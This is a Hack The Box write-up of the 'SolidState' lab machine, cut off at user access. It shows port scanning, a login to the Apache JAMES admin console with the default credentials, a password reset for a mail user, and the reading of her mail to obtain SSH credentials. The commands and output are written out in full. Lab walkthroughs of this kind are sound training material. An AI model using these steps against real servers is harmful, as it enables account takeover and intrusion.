---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags:  apache james pop3 smtp rce authenticatedrce remotecommandexecution defaultcredentials telnet rbash restrictedshell
---

<br />

![1](../../../assets/images/SolidState/1.png)

<br />

OS -> Linux.

Difficulty -> Medium.

<br />

# Introduction:

<br />


<br />

# Enumeration:

<br />

We begin with a standard `nmap` scan to identify open ports and running services:

<br />

```bash
❯ nmap -p- 10.10.10.51 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-13 16:50 CEST
Nmap scan report for 10.10.10.51
Host is up (0.080s latency).
Not shown: 65509 closed tcp ports (reset), 20 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.10 [10.10.14.10])
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.94SVN%I=7%D=8/13%Time=689CA653%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\
SF:nPlease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPas
SF:sword:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 276.87 seconds
```

<br />

Open Ports:

`Port 22` -> SSH

`Port 25` -> SMTP

`Port 80` -> HTTP

`Port 110` -> POP3

`Port 119` -> NNTP

`Port 4555` -> JAMES

<br />

# HTTP Enumeration: -> Port 80 

<br />

When we browse to the HTTP service, we see the following:

<br />

![2](../../../assets/images/SolidState/2.png)

<br />

The navigation menu includes additional endpoints, `about.html` and `services.html`, but neither contains relevant information.

<br />

![3](../../../assets/images/SolidState/3.png)

<br />

At the bottom of the page, there is a contact form:

<br />

![4](../../../assets/images/SolidState/4.png)

<br />

Submitting a message triggers a `POST` request to the `/` endpoint. This functionality does not appear to be exploitable or otherwise relevant.

<br />

# JAMES Remote Administration Tool 2.3.2

<br />

Several of the open ports belong to `Apache JAMES 2.3.2` services, including the `Remote Administration Tool` on port `4555`.

<br />

![5](../../../assets/images/SolidState/5.png)

<br />

Apache JAMES (`Java Apache Mail Enterprise Server`) is an open-source mail server built using `Java`. It provides all the necessary services to allow email communication, including (though IMAP is not enabled on this instance):

- `SMTP` (Simple Mail Transfer Protocol).

- `POP3` (Post Office Protocol version 3).

- `IMAP` (Internet Message Access Protocol).

- `NNTP` (Network News Transfer Protocol).

- `Remote Administration` via a dedicated port (in this case, 4555).

<br />

## Apache JAMES authenticated RCE:

<br />

Upon researching, we found that `Apache JAMES 2.3.2` is vulnerable to an authenticated `Remote Command Execution` (RCE).

<br />

```bash
❯ searchsploit james
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Remote Command Execution                                                                                                 | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)                                                                       | linux/remote/50347.py
WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overflow                                                                                  | windows/remote/944.c
```

<br />

Before investigating this vulnerability further, let's enumerate the other services.

<br />

### Login into JAMES Admin: -> Port 4555

<br />

We can connect to the service via `telnet`, and the default credentials `root:root` successfully authenticate.

<br />

```bash
❯ telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

<br />

We can display all available commands by running `HELP`:

<br />

```bash
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

<br />

Listing users reveals five existing accounts:

<br />

```bash
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

<br />

Another interesting command is `setpassword`. We can try to change the password of one of these accounts, like `mindy`:

<br />

```bash
setpassword mindy test123
Password for mindy reset
```

<br />

The password was successfully changed.

At this point, we can try to log into `POP3` service with those credentials.

To connect, we will use `telnet` again:

<br />

```bash
❯ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS test123
+OK Welcome mindy
```

<br />

It works.

We can now list the available emails for this user:

<br />

```bash
LIST
+OK 2 1945
1 1109
2 836
```

<br />

There are two emails.

The first one, does not contain relevant information.

The second email contains credentials in plaintext:

<br />

```bash
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

<br />

We have new credentials: `mindy:P@55W0rd1!2@`

Using these credentials, we can log in via `SSH` as `mindy`:

<br />

```bash
❯ ssh mindy@10.10.10.51
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
```

<br />

But if we try to run a command:

<br />

```bash
mindy@solidstate:~$ id   
-rbash: id: command not found
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
```

<br /> 

We're placed inside a restricted shell (`rbash`).

<br />

Despite the restrictions, we can still read the `user.txt` flag:

<br />

```bash
mindy@solidstate:~$ cat user.txt
b130c6e67c2ba7bce64e572d73xxxxxx
```

<br />
